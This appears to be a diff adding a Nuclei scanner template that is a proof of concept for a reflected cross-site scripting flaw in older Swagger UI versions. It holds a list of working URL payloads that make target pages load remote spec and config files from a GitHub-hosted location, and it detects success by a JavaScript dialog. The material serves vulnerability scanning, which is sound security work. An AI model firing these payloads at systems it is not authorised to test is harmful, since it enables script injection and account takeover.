@@ -1,0 +1,52 @@
+id: swagger-ui-xss
+
+info:
+  name: PoC for Swagger-UI XSS
+  author: MrL872, Haones
+  severity: medium
+  description: |
+    Swagger UI versions affected from 3.14.1 to, but not including 3.38.0. Fixed in 2021.
+  reference:
+    - https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/
+  metadata:
+    max-request: 15
+  tags: xss,swagger-ui
+
+headless:
+  - steps:
+      - args:
+          url: '{{BaseURL}}/{{xss}}'
+        action: navigate
+
+      - action: waitdialog
+        name: reflected_text_query
+        args:
+          max-duration: 3s
+
+    payloads:
+      xss:
+        - 'swagger-ui.html?configUrl=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/config.json'
+        - 'swagger-ui.html?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-domain.yaml'
+        - 'swagger-ui.html?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-fetch.yaml'
+        - 'index.html?configUrl=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/config.json'
+        - 'index.html?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-domain.yaml'
+        - 'index.html?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-fetch.yaml'
+        - 'swagger/index.html?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-domain.yaml'
+        - 'swagger/index.html?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-fetch.yaml'
+        - 'swagger/index.html?configUrl=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/config.json'
+        - 'swagger-ui/index.html?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-fetch.yaml'
+        - 'swagger-ui/index.html?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-domain.yaml'
+        - 'swagger-ui/index.html?configUrl=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/config.json'
+        - 'docs?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-fetch.yaml'
+        - 'docs?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-fetch.yaml'
+        - 'docs?configUrl=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/config.json'
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - reflected_text_query == true
+
+    extractors:
+      - type: dsl
+        dsl:
+          - matched
